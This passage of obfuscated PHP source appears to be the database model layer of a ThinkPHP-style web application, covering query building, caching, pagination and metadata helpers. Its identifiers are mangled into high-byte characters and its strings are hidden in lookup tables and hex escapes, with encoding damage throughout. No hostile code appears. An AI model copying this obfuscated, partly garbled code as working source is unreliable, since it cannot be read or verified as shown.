$„‡îşµã[53], $ÀÙ¢ïùµ); $ÀÙ¢ïùµ = $this->parseSql($ÀÙ¢ïùµ, $·›‚˜äü); return $this->db->query($ÀÙ¢ïùµ); } public function execute($‡¾çƒ½Š, $Üº¥ÕàÂ = false) { if (!is_bool($Üº¥ÕàÂ) && !is_array($Üº¥ÕàÂ)) { $Üº¥ÕàÂ = func_get_args(); array_shift($Üº¥ÕàÂ); } $‡¾çƒ½Š = $this->parseSql($‡¾çƒ½Š, $Üº¥ÕàÂ); return $this->db->execute($‡¾çƒ½Š); } protected function parseSql($ÄåËÕ¶, $ï‡¢‘ˆ) { $æîıÍÑ¢ =& $_SERVER[‘ÆÜ‘œ]; if (!0 === $ï‡¢‘ˆ) { $ŒôËà© = $this->_parseOptions(); $ÄåËÕ¶ = $this->db->parseSql($ÄåËÕ¶, $ŒôËà©); } elseif (is_array($ï‡¢‘ˆ)) { $ï‡¢‘ˆ = array_map(array($this->db, $æîıÍÑ¢[428]), $ï‡¢‘ˆ); $ÄåËÕ¶ = vsprintf($ÄåËÕ¶, $ï‡¢‘ˆ); } else { $ÄåËÕ¶ = strtr($ÄåËÕ¶, array($æîıÍÑ¢[429] => $this->getTableName(), $æîıÍÑ¢[430] => think_config($æîıÍÑ¢[331]))); } $this->db->setModel($this->name); return $ÄåËÕ¶; } public function db($’Ë×Êíü = '', $öûèµ§¹ = '', $¥»šÁº¡ = array()) { $ªÄÜş§Ö =& $_SERVER[‘ÆÜ‘œ]; if ($ªÄÜş§Ö[12] === $’Ë×Êíü && $this->db) { return $this->db; } static $¹£ì–õâ = array(); static $éªª§é = array(); if (!isset($éªª§é[$’Ë×Êíü]) || isset($éªª§é[$’Ë×Êíü]) && $öûèµ§¹ && $¹£ì–õâ[$’Ë×Êíü] != $öûèµ§¹) { if (!empty($öûèµ§¹) && is_string($öûèµ§¹) && !1 === strpos($öûèµ§¹, $ªÄÜş§Ö[8])) { $öûèµ§¹ = think_config($öûèµ§¹); } $’Ë×Êíü = think_guid($öûèµ§¹); $éªª§é[$’Ë×Êíü] = Db::getInstance($öûèµ§¹); } elseif (NULL === $öûèµ§¹) { $éªª§é[$’Ë×Êíü]->close(); unset($éªª§é[$’Ë×Êíü]); return; } if (!empty($¥»šÁº¡)) { if (is_string($¥»šÁº¡)) { parse_str($¥»šÁº¡, $¥»šÁº¡); } foreach ($¥»šÁº¡ as $¥ù‡íÁÂ => $èí¥¼‘ä) { $this->setProperty($¥ù‡íÁÂ, $èí¥¼‘ä); } } $¹£ì–õâ[$’Ë×Êíü] = $öûèµ§¹; $this->db = $éªª§é[$’Ë×Êíü]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $ÖíËãúŞ = get_class($this); if ($ÖíËãúŞ == $_SERVER[‘ÆÜ‘œ][431]) { return $this->name; } $this->name = substr($ÖíËãúŞ, 0, -5); } return $this->name; } public function getTableName() { $îÓÒ§©Ÿ =& $_SERVER[‘ÆÜ‘œ]; if (empty($this->trueTableName)) { $ı³´¢« = !empty($this->tablePrefix) ? $this->tablePrefix : $îÓÒ§©Ÿ[12]; if (!empty($this->tableName)) { $ı³´¢« .= $this->tableName; } else { $ı³´¢« .= think_parse_name($this->name); } $this->trueTableName = strtolower($ı³´¢«); } return (!empty($this->dbName) ? $this->dbName . $îÓÒ§©Ÿ[10] : $îÓÒ§©Ÿ[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $ñÃˆé©ó =& $_SERVER[‘ÆÜ‘œ]; return isset($this->fields[$ñÃˆé©ó[338]]) ? $this->fields[$ñÃˆé©ó[338]] : $this->pk; } public function getDbFields() { $ÃÓˆÛ± =& $_SERVER[‘ÆÜ‘œ]; if (isset($this->options[$ÃÓˆÛ±[367]])) { $óòä­Ãå = $this->db->getFields($this->options[$ÃÓˆÛ±[367]]); return $óòä­Ãå ? array_keys($óòä­Ãå) : !1; } if ($this->fields) { $óòä­Ãå = $this->fields; unset($óòä­Ãå[$ÃÓˆÛ±[337]], $óòä­Ãå[$ÃÓˆÛ±[338]], $óòä­Ãå[$ÃÓˆÛ±[339]], $óòä­Ãå[$ÃÓˆÛ±[336]]); return $óòä­Ãå; } return !1; } public function data($—Øªèí˜ = '') { $¬ÓÎú® =& $_SERVER[‘ÆÜ‘œ]; if ($¬ÓÎú®[12] === $—Øªèí˜ && !empty($this->data)) { return $this->data; } if (is_object($—Øªèí˜)) { $—Øªèí˜ = get_object_vars($—Øªèí˜); } elseif (is_string($—Øªèí˜)) { parse_str($—Øªèí˜, $—Øªèí˜); } elseif (!is_array($—Øªèí˜)) { think_exception(think_lang($¬ÓÎú®[359])); } $this->data = $—Øªèí˜; return $this; } public function join($¿óº®ä) { $ççïËœ³ =& $_SERVER[‘ÆÜ‘œ]; if (is_array($¿óº®ä)) { $this->options[$ççïËœ³[370]] = $¿óº®ä; } elseif (!empty($¿óº®ä)) { $this->options[$ççïËœ³[370]][] = $¿óº®ä; } return $this; } public function union($–ú´ïñö, $Šºšµ·¸ = false) { $şº…ä³§ =& $_SERVER[‘ÆÜ‘œ]; if (empty($–ú´ïñö)) { return $this; } if ($Šºšµ·¸) { $this->options[$şº…ä³§[432]][$şº…ä³§[433]] = !0; } if (is_object($–ú´ïñö)) { $–ú´ïñö = get_object_vars($–ú´ïñö); } if (is_string($–ú´ïñö)) { $¨Ñå‰¶š = $–ú´ïñö; } elseif (is_array($–ú´ïñö)) { if (isset($–ú´ïñö[0])) { $this->options[$şº…ä³§[432]] = array_merge($this->options[$şº…ä³§[432]], $–ú´ïñö); return $this; } else { $¨Ñå‰¶š = $–ú´ïñö; } } else { think_exception(think_lang($şº…ä³§[359])); } $this->options[$şº…ä³§[432]][] = $¨Ñå‰¶š; return $this; } public function cache($¨´€Ö—‡ = true, $Ûù—…îí = null, $‹“ı†‚ = '') { $´‘¿œó¥ =& $_SERVER[‘ÆÜ‘œ]; if (!1 !== $¨´€Ö—‡) { $this->options[$´‘¿œó¥[434]] = array($´‘¿œó¥[95] => $¨´€Ö—‡, $´‘¿œó¥[424] => $Ûù—…îí, $´‘¿œó¥[33] => $‹“ı†‚); } return $this; } public function field($äöŞ…ÁÈ, $¾÷’Í¯ª = false) { $¨ÒÎóàê =& $_SERVER[‘ÆÜ‘œ]; if (!0 === $äöŞ…ÁÈ) { $ÍÛÅÂ´Û = $this->getDbFields(); $äöŞ…ÁÈ = $ÍÛÅÂ´Û ? $ÍÛÅÂ´Û : $¨ÒÎóàê[221]; } elseif ($¾÷’Í¯ª) { if (is_string($äöŞ…ÁÈ)) { $äöŞ…ÁÈ = explode($¨ÒÎóàê[50], $äöŞ…ÁÈ); } $ÍÛÅÂ´Û = $this->getDbFields(); $äöŞ…ÁÈ = $ÍÛÅÂ´Û ? array_diff($ÍÛÅÂ´Û, $äöŞ…ÁÈ) : $äöŞ…ÁÈ; } $this->options[$¨ÒÎóàê[361]] = $äöŞ…ÁÈ; return $this; } public function scope($éµä›°Á = '', $ŒË³–² = NULL) { $Ú†õ´Ò =& $_SERVER[‘ÆÜ‘œ]; if ($Ú†õ´Ò[12] === $éµä›°Á) { if (isset($this->_scope[$Ú†õ´Ò[37]])) { $€ØŞÆ¿‹ = $this->_scope[$Ú†õ´Ò[37]]; } else { return $this; } } elseif (is_string($éµä›°Á)) { $¬µô“”ê = explode($Ú†õ´Ò[50], $éµä›°Á); $€ØŞÆ¿‹ = array(); foreach ($¬µô“”ê as $ğÄ†‚®Ù) { if (!isset($this->_scope[$ğÄ†‚®Ù])) { continue; } $€ØŞÆ¿‹ = array_merge($€ØŞÆ¿‹, $this->_scope[$ğÄ†‚®Ù]); } if (!empty($ŒË³–²) && is_array($ŒË³–²)) { $€ØŞÆ¿‹ = array_merge($€ØŞÆ¿‹, $ŒË³–²); } } elseif (is_array($éµä›°Á)) { $€ØŞÆ¿‹ = $éµä›°Á; } if (is_array($€ØŞÆ¿‹) && !empty($€ØŞÆ¿‹)) { $this->options = array_merge($this->options, array_change_key_case($€ØŞÆ¿‹)); } return $this; } public function where($Ñø¤æ‚Ó, $Ü›–çÅ¼ = null) { $í•«±† =& $_SERVER[‘ÆÜ‘œ]; if (!is_null($Ü›–çÅ¼) && is_string($Ñø¤æ‚Ó)) { if (!is_array($Ü›–çÅ¼)) { $Ü›–çÅ¼ = func_get_args(); array_shift($Ü›–çÅ¼); } $Ü›–çÅ¼ = array_map(array($this->db, $í•«±†[428]), $Ü›–çÅ¼); $Ñø¤æ‚Ó = vsprintf($Ñø¤æ‚Ó, $Ü›–çÅ¼); } elseif (is_object($Ñø¤æ‚Ó)) { $Ñø¤æ‚Ó = get_object_vars($Ñø¤æ‚Ó); } elseif (is_array($Ñø¤æ‚Ó)) { foreach ($Ñø¤æ‚Ó as $éñÍÕò™ => $ˆĞƒÏ²¦) { if ((is_numeric($éñÍÕò™) || !$éñÍÕò™) && is_string($ˆĞƒÏ²¦)) { if (strpos($ˆĞƒÏ²¦, $í•«±†[435]) === 0) { continue; } think_trace($í•«±†[436], $í•«±†[12], $í•«±†[49]); die; } } } if (is_string($Ñø¤æ‚Ó) && $í•«±†[12] != $Ñø¤æ‚Ó) { $ÜóÁÍë‡ = array(); $ÜóÁÍë‡[$í•«±†[437]] = $Ñø¤æ‚Ó; $Ñø¤æ‚Ó = $ÜóÁÍë‡; } if (isset($this->options[$í•«±†[363]])) { $this->options[$í•«±†[363]] = array_merge($this->options[$í•«±†[363]], $Ñø¤æ‚Ó); } else { $this->options[$í•«±†[363]] = $Ñø¤æ‚Ó; } return $this; } public function limit($ÑÎ‹Äğ•, $•ù›¯ÕÓ = null) { $îñ¼ğç© =& $_SERVER[‘ÆÜ‘œ]; $this->options[$îñ¼ğç©[378]] = is_null($•ù›¯ÕÓ) ? $ÑÎ‹Äğ• : $ÑÎ‹Äğ• . $îñ¼ğç©[50] . $•ù›¯ÕÓ; return $this; } public function page($„±Öô‘÷, $¼‹åš¼º = null) { $ÖÌµšò =& $_SERVER[‘ÆÜ‘œ]; $this->options[$ÖÌµšò[438]] = is_null($¼‹åš¼º) ? $„±Öô‘÷ : $„±Öô‘÷ . $ÖÌµšò[50] . $¼‹åš¼º; return $this; } public function comment($€´¹Ÿ«’) { $this->options[$_SERVER[‘ÆÜ‘œ][439]] = $€´¹Ÿ«’; return $this; } public function setProperty($¡Ğ  ß, $øÖİ¥¾ú) { if (property_exists($this, $¡Ğ  ß)) { $this->{$¡Ğ  ß} = $øÖİ¥¾ú; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\x6f\144\151\146\x79\x54\151\x6d\145", "\164\x69\155\x65", "\151\156\x73\x65\162\x74\x2c\165\x70\x64\x61\164\145", "\x66\x75\x6e\x63\x74\x69\x6f\x6e"), array("\143\162\x65\x61\164\x65\124\151\x6d\x65", "\164\x69\155\x65", "\x69\156\163\145\162\164", "\x66\165\156\143\x74\151\x6f\x6e")); public function setDataAuto($Óùü…Ê) { $this->dataAuto = $Óùü…Ê; } public function __construct($†ÍÈ— = '', $„¥±—ƒ = '', $×ùŞ©Ïí = '') { parent::__construct($†ÍÈ—, $„¥±—ƒ, $×ùŞ©Ïí); } protected $tableMeta = array(); protected function _beforeInsert(&$Óä“€Ï, $€Ğ£³İ™) { $¼¶¾Ç©  =& $_SERVER[‘ÆÜ‘œ]; if (!$this->checkDataAutoHas($¼¶¾Ç© [440])) { return; } $this->dataBeforeFilter($Óä“€Ï, $¼¶¾Ç© [440]); } protected function _beforeUpdate(&$º¸ü¶Ôº, $‹¥å•‚”) { $àÏØêî =& $_SERVER[‘ÆÜ‘œ]; if (!$this->checkDataAutoHas($àÏØêî[441])) { return; } $this->dataBeforeFilter($º¸ü¶Ôº, $àÏØêî[441]); } protected function _afterSelect(&$Ú÷øšÜğ, $à¾çÍ©ú) { if (!is_array($Ú÷øšÜğ)) { return; } if (!$this->checkDataAutoHas($_SERVER[‘ÆÜ‘œ][442])) { return; } foreach ($Ú÷øšÜğ as &$§ÎîÏ¬£) { $this->dataAfterFilter($§ÎîÏ¬£); } unset($§ÎîÏ¬£); } protected function _afterFind(&$ã¿²Ô÷, $úî™¼«) { if (!is_array($ã¿²Ô÷)) { return; } if (!$this->checkDataAutoHas($_SERVER[‘ÆÜ‘œ][442])) { return; } $this->dataAfterFilter($ã¿²Ô÷); } public static function textEncode($ñÌ•öµœ) { if (!$ñÌ•öµœ) { return $ñÌ•öµœ; } $ø‚¶•ºŞ = json_encode($ñÌ•öµœ); $ø‚¶•ºŞ = preg_replace_callback($_SERVER[‘ÆÜ‘œ][443], function ($é² ¤ÉÆ) { return addslashes($é² ¤ÉÆ[0]); }, $ø‚¶•ºŞ); return json_decode($ø‚¶•ºŞ); } public static function textDecode($ŠåÇö‚û) { $‚íş¦öÉ =& $_SERVER[‘ÆÜ‘œ]; if (!$ŠåÇö‚û) { return $ŠåÇö‚û; } $Ï¢Æ·óû = json_encode($ŠåÇö‚û); $Ï¢Æ·óû = preg_replace_callback($‚íş¦öÉ[444], function ($Ù®€óé) { return $_SERVER[‘ÆÜ‘œ][98]; }, $Ï¢Æ·óû); return json_decode($Ï¢Æ·óû); } public function setAutoIncrement($–ÉÛ•ºÇ) { $‰ÒÄŞîÊ = array($this->getPk() => $–ÉÛ•ºÇ); $…ššãş = $this->data($‰ÒÄŞîÊ)->add(); if ($…ššãş) { $this->delete($…ššãş); } } public function getAutoIncrement() { $ˆ¨¨Şë¡ = $this->getTableName(); $–ÊÔŒğœ = $this->max($this->getPk()); $ıÂÃüµ = $this->query("\163\150\157\x77\x20\x74\141\142\154\145\40\163\x74\141\x74\165\x73\40\167\150\x65\x72\x65\x20\x4e\141\155\145\75\47{$ˆ¨¨Şë¡}\x27"); $Û¥ªÍá¬ = $ıÂÃüµ[0][$_SERVER[‘ÆÜ‘œ][445]]; $¤¨Â˜úó = max($–ÊÔŒğœ, $Û¥ªÍá¬); return $¤¨Â˜úó; } protected function _callBefore($¡óƒÁÀ©, $¥üãĞØ) { return $this->cacheCallCheck($¡óƒÁÀ©, $¥üãĞØ, !1); } protected function _callAfter($ÁÈİ€ò, $ñ‹ïŞ×á) { return $this->cacheCallCheck($ÁÈİ€ò, $ñ‹ïŞ×á, !0); } protected function cacheFunctionAlias($·¶âÓ“æ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($µœñ¨¬Â, $ğ…Ÿû¸„, $©¼ÑÓØ = false) { $½ÓÒ½ÖÅ =& $_SERVER[‘ÆÜ‘œ]; $ÚÖÕ§± = $this->cacheFunctionAlias($ğ…Ÿû¸„); if (!$ÚÖÕ§±) { return; } foreach ($ÚÖÕ§± as $§¦í“ëĞ => $Úíì‹õÊ) { $ååš„©õ = $Úíì‹õÊ[0]; $èô‰ªÕ” = explode($½ÓÒ½ÖÅ[50], $Úíì‹õÊ[1]); $œ»ğƒ¡Â = isset($Úíì‹õÊ[2]) ? $Úíì‹õÊ[2] : $½ÓÒ½ÖÅ[12]; if ($µœñ¨¬Â == $§¦í“ëĞ) { return $this->cacheFunctionGet($§¦í“ëĞ, $ååš„©õ, $œ»ğƒ¡Â); } if ($©¼ÑÓØ && in_array($µœñ¨¬Â, $èô‰ªÕ”)) { $this->cacheFunctionClear($§¦í“ëĞ, $ååš„©õ, $œ»ğƒ¡Â); } } } public function cacheFunctionGet($Îú—“…, $½¸Ï‘§ç, $“ÚòÚª = '') { $Š²‰Ú¬ =& $_SERVER[‘ÆÜ‘œ]; $¤¦¼ÈÜ¯ = $this->cacheKeyMake($Îú—“…, $½¸Ï‘§ç, $“ÚòÚª); $É¯°¨•­ = Cache::get($¤¦¼ÈÜ¯); if (!is_array($É¯°¨•­)) { if (method_exists($this, $Š²‰Ú¬[351] . $Îú—“…)) { $Îú—“… = $Š²‰Ú¬[351] . $Îú—“…; } $É¯°¨•­ = call_user_func_array(array($this, $Îú—“…), array($½¸Ï‘§ç, !0)); Cache::set($¤¦¼ÈÜ¯, $É¯°¨•­); } return $É¯°¨•­; } public function cacheFunctionClear($á‰«®›, $»¤ôœü, $òÁ÷¯ºÒ = '') { $ñ³–¸ = $»¤ôœü; if (!is_array($»¤ôœü)) { $ñ³–¸ = array($»¤ôœü); } foreach ($ñ³–¸ as $Úü´ÍÓò) { $â³¥¾—“ = $this->cacheKeyMake($á‰«®›, $Úü´ÍÓò, $òÁ÷¯ºÒ); Cache::remove($â³¥¾—“); } } public function cacheKeyMake($ıÒÑàŠÔ, $ó¬ÀŒĞ¥, $º­æù²Á) { $š¨Ï•¬­ =& $_SERVER[‘ÆÜ‘œ]; if ($º­æù²Á) { $ó¬ÀŒĞ¥ = $ó¬ÀŒĞ¥ . $š¨Ï•¬­[446] . $º­æù²Á; } return get_class($this) . $š¨Ï•¬­[11] . $ıÒÑàŠÔ . $š¨Ï•¬­[447] . $ó¬ÀŒĞ¥; } protected function selectPageReset() { $³ÙËÃóº =& $_SERVER[‘ÆÜ‘œ]; if (isset($GLOBALS[$³ÙËÃóº[448]])) { return; } $GLOBALS[$³ÙËÃóº[448]] = isset($GLOBALS[$³ÙËÃóº[7]][$³ÙËÃóº[449]]) ? $GLOBALS[$³ÙËÃóº[7]][$³ÙËÃóº[449]] : !1; $GLOBALS[$³ÙËÃóº[450]] = isset($GLOBALS[$³ÙËÃóº[7]][$³ÙËÃóº[438]]) ? $GLOBALS[$³ÙËÃóº[7]][$³ÙËÃóº[438]] : !1; $GLOBALS[$³ÙËÃóº[7]][$³ÙËÃóº[449]] = !1; $GLOBALS[$³ÙËÃóº[7]][$³ÙËÃóº[438]] = !1; } protected function selectPageRestore() { $âèßüíå =& $_SERVER[‘ÆÜ‘œ]; if (!isset($GLOBALS[$âèßüíå[448]])) { return; } $GLOBALS[$âèßüíå[7]][$âèßüíå[449]] = $GLOBALS[$âèßüíå[448]]; $GLOBALS[$âèßüíå[7]][$âèßüíå[438]] = $GLOBALS[$âèßüíå[450]]; if ($GLOBALS[$âèßüíå[7]][$âèßüíå[449]] === !1) { unset($GLOBALS[$âèßüíå[7]][$âèßüíå[449]]); } if ($GLOBALS[$âèßüíå[7]][$âèßüíå[438]] === !1) { unset($GLOBALS[$âèßüíå[7]][$âèßüíå[438]]); } unset($GLOBALS[$âèßüíå[448]]); unset($GLOBALS[$âèßüíå[450]]); } protected function selectPage($„ÒÑ¶¬‚ = 200, $‰æİÃß» = 1) { $›³“ëÜı =& $_SERVER[‘ÆÜ‘œ]; global $in; $””Ü±à¤ = $this->optionsValue(); $Ó®æ©éİ = 50000; $„ÒÑ¶¬‚ = isset($in[$›³“ëÜı[449]]) && $in[$›³“ëÜı[449]] ? $in[$›³“ëÜı[449]] : $„ÒÑ¶¬‚; if ($„ÒÑ¶¬‚ === -1) { $in[$›³“ëÜı[449]] = !1; $Ó®æ©éİ = 100000000; $„ÒÑ¶¬‚ = $Ó®æ©éİ; } $µŞİ‡—‹ = $””Ü±à¤; $µŞİ‡—‹[$›³“ëÜı[451]] = array(); $„ÒÑ¶¬‚ = intval($„ÒÑ¶¬‚); $„ÒÑ¶¬‚ = $„ÒÑ¶¬‚ <= 5 ? 5 : ($„ÒÑ¶¬‚ >= $Ó®æ©éİ ? $Ó®æ©éİ : $„ÒÑ¶¬‚); $‰æİÃß» = intval(isset($in[$›³“ëÜı[438]]) && $in[$›³“ëÜı[438]] ? $in[$›³“ëÜı[438]] : $‰æİÃß»); $‰æİÃß» = $‰æİÃß» <= 1 ? 1 : $‰æİÃß»; $¸›ÙàÒè = array(); $ ş¹ÏÍ = 1; if ($‰æİÃß» == 1 && $ ş¹ÏÍ) { $this->optionsValue($””Ü±à¤); $¸›ÙàÒè = $this->page($‰æİÃß», $„ÒÑ¶¬‚)->select(); $µù÷ì§Õ = is_array($¸›ÙàÒè) ? count($¸›ÙàÒè) : 0; if ($µù÷ì§Õ < $„ÒÑ¶¬‚) { $¨ûï» = 1; } else { $this->optionsValue($µŞİ‡—‹); $µù÷ì§Õ = intval($this->count()); $¨ûï» = ceil($µù÷ì§Õ / $„ÒÑ¶¬‚); } } else { $this->optionsValue($µŞİ‡—‹); $µù÷ì§Õ = intval($this->count()); $¨ûï» = ceil($µù÷ì§Õ / $„ÒÑ¶¬‚); $‰æİÃß» = $‰æİÃß» >= $¨ûï» ? $¨ûï» : $‰æİÃß»; $this->optionsValue($””Ü±à¤); $¸›ÙàÒè = $this->page($‰æİÃß», $„ÒÑ¶¬‚)->select(); } if (!is_array($¸›ÙàÒè)) { $¸›ÙàÒè = array(); } if ($¨ûï» == 1) { $µù÷ì§Õ = count($¸›ÙàÒè); } $é§¨€ = array($›³“ëÜı[452] => array($›³“ëÜı[453] => $µù÷ì§Õ, $›³“ëÜı[449] => $„ÒÑ¶¬‚, $›³“ëÜı[438] => $‰æİÃß», $›³“ëÜı[454] => $¨ûï»), $›³“ëÜı[455] => $¸›ÙàÒè); return $é§¨€; } protected function checkLength($«à§õõ, $³÷µÑÕ = 0, $“šğêá‰ = '') { $›ìüåı² =& $_SERVER[‘ÆÜ‘œ]; $³÷µÑÕ = $³÷µÑÕ ? $³÷µÑÕ : 65536; if (!$«à§õõ || strlen($«à§õõ) < $³÷µÑÕ) { return; } $“šğêá‰ = $“šğêá‰ ? $“šğêá‰ . $›ìüåı²[74] : $›ìüåı²[12]; show_json($“šğêá‰ . LNG($›ìüåı²[456]) . "\x28{$³÷µÑÕ}\51", !1); } protected function metaSet($¦œğ£, $üïŠ™Ù‚ = null, $ëå»Á—è = null) { $„ç…¿¢Ï =& $_SERVER[‘ÆÜ‘œ]; if (!$this->tableMeta || !$¦œğ£) { return !1; } $¨‡“¢ìº = $this->tableMeta[$„ç…¿¢Ï[457]]; $ç¹ØË’É = $this->tableMeta[$„ç…¿¢Ï[458]]; $ŒËÔüÚƒ = Model($ç¹ØË’É); $²òá“€ = array($¨‡“¢ìº => $¦œğ£, $„ç…¿¢Ï[459] => $üïŠ™Ù‚); if (is_null($üïŠ™Ù‚)) { return $ŒËÔüÚƒ->where(array($¨‡“¢ìº => $¦œğ£))->delete(); } if (is_null($ëå»Á—è) && is_string($üïŠ™Ù‚)) { return $ŒËÔüÚƒ->where($²òá“€)->delete(); } $ıæ®«Ò’ = is_array($üïŠ™Ù‚) ? $üïŠ™Ù‚ : array(); if (is_string($üïŠ™Ù‚)) { $ıæ®«Ò’[$üïŠ™Ù‚] = $ëå»Á—è; } $‘Ø¡‰—ã = array(); foreach ($ıæ®«Ò’ as $ıÀá˜½Ï => $ê‡Üİç) { if (is_null($ê‡Üİç) && is_string($ıÀá˜½Ï)) { $ŒËÔüÚƒ->where(array($¨‡“¢ìº => $¦œğ£, $„ç…¿¢Ï[459] => $ıÀá˜½Ï))->delete(); continue; } $this->checkLength($ê‡Üİç, !1, $ç¹ØË’É . $„ç…¿¢Ï[4] . $ıÀá˜½Ï); $‘Ø¡‰—ã[] = array($¨‡“¢ìº => $¦œğ£, $„ç…¿¢Ï[95] => $ıÀá˜½Ï, $„ç…¿¢Ï[460] => $ê‡Üİç); } $ƒ»‚èÉ« = $„ç…¿¢Ï[461] . $ç¹ØË’É; CacheLock::lock($ƒ»‚èÉ«); $ŒËÔüÚƒ->where(array($¨‡“¢ìº => $¦œğ£))->addAll($‘Ø¡‰—ã, array(), !0); CacheLock::unlock($ƒ»‚èÉ«); return !0; } public function metaGet($Ÿûì„‰, $äú¼Èû = false) { $×ø©±ê =& $_SERVER[‘ÆÜ‘œ]; if (!$this->tableMeta) { return array(); } $şû»ÁğØ = $this->tableMeta[$×ø©±ê[457]]; $‘²şÍö® = Model($this->tableMeta[$×ø©±ê[458]]); if ($äú¼Èû) { $ò•®İ›õ = array($şû»ÁğØ => $Ÿûì„‰, $×ø©±ê[95] => $äú¼Èû); return $‘²şÍö®->where($ò•®İ›õ)->getField($×ø©±ê[460]); } $ò•®İ›õ = array($şû»ÁğØ => $Ÿûì„‰); $Û©”­•‡ = $‘²şÍö®->field($×ø©±ê[462])->where($ò•®İ›õ)->select(); $Û©”­•‡ = array_to_keyvalue($Û©”­•‡, $×ø©±ê[95], $×ø©±ê[460]); return $Û©”­•‡; } private function checkDataAutoHas($î‘™ğ“) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $˜âŞ¨’) { if (in_array($î‘™ğ“, explode($_SERVER[‘ÆÜ‘œ][50], $˜âŞ¨’[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$€”Á´¢ò, $İşà‚à±) { $Œ¨Å‚ó =& $_SERVER[‘ÆÜ‘œ]; if (!is_array($€”Á´¢ò)) { return; } foreach ($this->dataAuto as $´¿¶ß´÷) { $éºßÊ²Ÿ = $´¿¶ß´÷[0]; if (!in_array($İşà‚à±, explode($Œ¨Å‚ó[50], $´¿¶ß´÷[2]))) { continue; } switch (trim($´¿¶ß´÷[3])) { case $Œ¨Å‚ó[406]: case $Œ¨Å‚ó[407]: $Ñßèëş = $´¿¶ß´÷[1]; $—ÇßñÛø = isset($´¿¶ß´÷[4]) ? (array) $´¿¶ß´÷[4] : array(); if ($Ñßèëş == $Œ¨Å‚ó[205] && array_key_exists($éºßÊ²Ÿ, $€”Á´¢ò)) { if (!$€”Á´¢ò[$éºßÊ²Ÿ]) { unset($€”Á´¢ò[$éºßÊ²Ÿ]); } break; } if (isset($€”Á´¢ò[$éºßÊ²Ÿ])) { array_unshift($—ÇßñÛø, $€”Á´¢ò[$éºßÊ²Ÿ]); } if ($Œ¨Å‚ó[406] == $´¿¶ß´÷[3]) { $€”Á´¢ò[$éºßÊ²Ÿ] = call_user_func_array($Ñßèëş, $—ÇßñÛø); } else { $€”Á´¢ò[$éºßÊ²Ÿ] = call_user_func_array(array(&$this, $Ñßèëş), $—ÇßñÛø); } break; case $Œ¨Å‚ó[358]: if (isset($€”Á´¢ò[$éºßÊ²Ÿ]) && $€”Á´¢ò[$éºßÊ²Ÿ]) { $€”Á´¢ò[$éºßÊ²Ÿ] = call_user_func_array(array(&$this, $´¿¶ß´÷[1]), array($€”Á´¢ò[$éºßÊ²Ÿ])); } break; case $Œ¨Å‚ó[361]: $€”Á´¢ò[$éºßÊ²Ÿ] = $€”Á´¢ò[$´¿¶ß´÷[1]]; break; case $Œ¨Å‚ó[379]: if (isset($€”Á´¢ò[$éºßÊ²Ÿ]) && !is_string($€”Á´¢ò[$éºßÊ²Ÿ])) { $€”Á´¢ò[$éºßÊ²Ÿ] = json_encode_force($€”Á´¢ò[$éºßÊ²Ÿ]); $€”Á´¢ò[$éºßÊ²Ÿ] = self::textEncode($€”Á´¢ò[$éºßÊ²Ÿ]); } break; case $Œ¨Å‚ó[408]: if ($€”Á´¢ò[$éºßÊ²Ÿ] === $Œ¨Å‚ó[12]) { unset($€”Á´¢ò[$éºßÊ²Ÿ]); } break; case $Œ¨Å‚ó[409]: $€”Á´¢ò[$éºßÊ²Ÿ] = $´¿¶ß´÷[1]; default: break; } } if ($İşà‚à± == $Œ¨Å‚ó[440]) { $¥Ó«¢šù = strtolower($this->db->getDbType()); if (strpos($¥Ó«¢šù, $Œ¨Å‚ó[13]) !== 0) { return; } $­ÚØÀ²× = $this->field(!0)->fields; $˜·€Û€ô = $­ÚØÀ²×[$Œ¨Å‚ó[339]]; if (isset($­ÚØÀ²×[$Œ¨Å‚ó[338]])) { unset($˜·€Û€ô[$­ÚØÀ²×[$Œ¨Å‚ó[338]]]); } foreach ($˜·€Û€ô as $ú¦¤Ø‘ç => $İşà‚à±) { if (!isset($€”Á´¢ò[$ú¦¤Ø‘ç])) { $€”Á´¢ò[$ú¦¤Ø‘ç] = $Œ¨Å‚ó[12]; } } } } private function dataAfterFilter(&$š¼µùÎ) { $Çüà™¼ =& $_SERVER[‘ÆÜ‘œ]; foreach ($this->dataAuto as $¸ööÊùÃ) { $¦ÀÆú×Á = $¸ööÊùÃ[0]; if (!isset($š¼µùÎ[$¦ÀÆú×Á])) { continue; } if (!in_array($Çüà™¼[442], explode($Çüà™¼[50], $¸ööÊùÃ[2]))) { continue; } switch (trim($¸ööÊùÃ[3])) { case $Çüà™¼[406]: case $Çüà™¼[407]: $„¦ÛüåÛ = isset($¸ööÊùÃ[4]) ? (array) $¸ööÊùÃ[4] : array(); array_unshift($„¦ÛüåÛ, $š¼µùÎ[$¦ÀÆú×Á]); if (isset($¸ööÊùÃ[4]) && $¸ööÊùÃ[4] == $Çüà™¼[463]) { $„¦ÛüåÛ = array($š¼µùÎ[$¦ÀÆú×Á]); } if ($Çüà™¼[406] == $¸ööÊùÃ[3]) { $š¼µùÎ[$¦ÀÆú×Á] = call_user_func_array($¸ööÊùÃ[1], $„¦ÛüåÛ); } else { $š¼µùÎ[$¦ÀÆú×Á] = call_user_func_array(array(&$this, $¸ööÊùÃ[1]), $„¦ÛüåÛ); } break; case $Çüà™¼[358]: if (isset($š¼µùÎ[$¦ÀÆú×Á]) && $š¼µùÎ[$¦ÀÆú×Á]) { $š¼µùÎ[$¦ÀÆú×Á] = call_user_func_array(array(&$this, $¸ööÊùÃ[1]), array($š¼µùÎ[$¦ÀÆú×Á])); } break; case $Çüà™¼[361]: $š¼µùÎ[$¦ÀÆú×Á] = $š¼µùÎ[$¸ööÊùÃ[1]]; break; case $Çüà™¼[379]: $ìæâ×æ³ = $š¼µùÎ[$¦ÀÆú×Á]; $ìæâ×æ³ = 